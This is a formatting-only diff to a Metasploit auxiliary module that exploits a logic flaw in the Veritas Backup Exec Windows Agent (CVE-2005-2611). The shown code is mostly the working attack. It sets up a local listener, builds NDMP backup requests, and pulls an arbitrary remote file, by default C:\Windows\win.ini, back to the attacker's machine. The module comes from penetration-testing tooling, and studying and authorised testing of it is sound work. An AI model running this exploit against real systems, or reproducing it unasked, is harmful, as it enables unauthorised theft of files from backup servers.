@@ -7,62 +7,68 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::NDMP
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Veritas Backup Exec Windows Remote File Access',
-      'Description'    => %q{
-        This module abuses a logic flaw in the Backup Exec Windows Agent to download
-        arbitrary files from the system. This flaw was found by someone who wishes to
-        remain anonymous and affects all known versions of the Backup Exec Windows Agent. The
-        output file is in 'MTF' format, which can be extracted by the 'NTKBUp' program
-        listed in the references section. To transfer an entire directory, specify a
-        path that includes a trailing backslash.
-      },
-      'Author'         => [ 'hdm', 'Unknown' ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'Veritas Backup Exec Windows Remote File Access',
+        'Description' => %q{
+          This module abuses a logic flaw in the Backup Exec Windows Agent to download
+          arbitrary files from the system. This flaw was found by someone who wishes to
+          remain anonymous and affects all known versions of the Backup Exec Windows Agent. The
+          output file is in 'MTF' format, which can be extracted by the 'NTKBUp' program
+          listed in the references section. To transfer an entire directory, specify a
+          path that includes a trailing backslash.
+        },
+        'Author' => [ 'hdm', 'Unknown' ],
+        'License' => MSF_LICENSE,
+        'References' => [
           ['CVE', '2005-2611'],
           ['OSVDB', '18695'],
           ['BID', '14551'],
           ['URL', 'http://www.fpns.net/willy/msbksrc.lzh'],
         ],
-      'Actions'     =>
-        [
+        'Actions' => [
           ['Download', 'Description' => 'Download arbitrary file']
         ],
-      'DefaultAction' => 'Download'
-      ))
+        'DefaultAction' => 'Download'
+      )
+    )
 
     register_options(
       [
         Opt::RPORT(10000),
-        OptAddressLocal.new('LHOST',
+        OptAddressLocal.new(
+          'LHOST',
           [
             false,
             "The local IP address to accept the data connection"
           ]
         ),
-        OptPort.new('LPORT',
+        OptPort.new(
+          'LPORT',
           [
             false,
             "The local port to accept the data connection"
           ]
         ),
-        OptString.new('RPATH',
+        OptString.new(
+          'RPATH',
           [
             true,
             "The remote filesystem path to download",
             "C:\\Windows\\win.ini"
           ]
         ),
-        OptString.new('LPATH',
+        OptString.new(
+          'LPATH',
           [
             true,
             "The local filename to store the exported data",
             "backupexec_dump.mtf"
           ]
         ),
-      ])
+      ]
+    )
   end
 
   def run
@@ -105,7 +111,6 @@ class MetasploitModule < Msf::Auxiliary
       disconnect
       return
     end
-
 
     #
     # Create our listener for the data connection
@@ -150,7 +155,6 @@ class MetasploitModule < Msf::Auxiliary
     rfd = sfd.accept()
     sfd.close
 
-
     #
     # Create the Mover Set Record Size request
     #
@@ -177,11 +181,11 @@ class MetasploitModule < Msf::Auxiliary
     # Define our tranfer parameters
     #
     xenv =
-    [
-      ['USERNAME', ''],
-      ['BU_EXCLUDE_ACTIVE_FILES', '0'],
-      ['FILESYSTEM', "\"\\\\#{datastore['RHOST']}\\#{datastore['RPATH']}\",v0,t0,l0,n0,f0"]
-    ]
+      [
+        ['USERNAME', ''],
+        ['BU_EXCLUDE_ACTIVE_FILES', '0'],
+        ['FILESYSTEM', "\"\\\\#{datastore['RHOST']}\\#{datastore['RPATH']}\",v0,t0,l0,n0,f0"]
+      ]
 
     #
     # Create the DATA_START_BACKUP request
@@ -202,7 +206,7 @@ class MetasploitModule < Msf::Auxiliary
     # Encode the transfer parameters
     #
     xenv.each do |e|
-      k,v = e
+      k, v = e
 
       # Variable
       bkup += [k.length].pack('N')
@@ -266,6 +270,5 @@ class MetasploitModule < Msf::Auxiliary
 
     print_status("Transferred #{bcnt} bytes.")
     disconnect
-
   end
 end
